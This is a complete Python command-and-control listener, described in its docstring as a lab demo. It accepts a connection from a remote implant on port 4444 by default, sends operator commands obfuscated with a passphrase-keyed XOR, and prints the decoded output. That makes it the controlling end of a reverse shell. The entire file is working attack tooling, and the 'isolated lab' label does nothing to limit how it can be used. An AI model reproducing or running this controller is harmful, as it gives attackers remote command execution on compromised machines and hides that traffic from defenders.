#!/usr/bin/env python3
"""
Minimal C2 listener for demo in an isolated lab.
Usage: python3 listener.py <bind_ip> <port> <passphrase>
"""
import socket, sys, threading

BIND = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
PASS = sys.argv[3] if len(sys.argv) > 3 else "redops"

def xor(data, key):
    return bytes([b ^ key[i % len(key)] for i,b in enumerate(data)])

key = PASS.encode()

def handle(conn, addr):
    print("[*] connection from", addr)
    try:
        while True:
            cmd = input("C2> ")
            if not cmd:
                continue
            if cmd.lower() in ("exit","quit"):
                conn.send(xor(b"exit\n", key))
                break
            conn.send(xor(cmd.encode()+b"\n", key))
            resp = conn.recv(65536)
            if not resp:
                break
            print("--->", xor(resp, key).decode(errors='ignore'))
    except Exception as e:
        print("handler err:", e)
    finally:
        conn.close()

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((BIND, PORT))
s.listen(1)
print("[*] listening on", BIND, PORT)
conn, addr = s.accept()
handle(conn, addr)
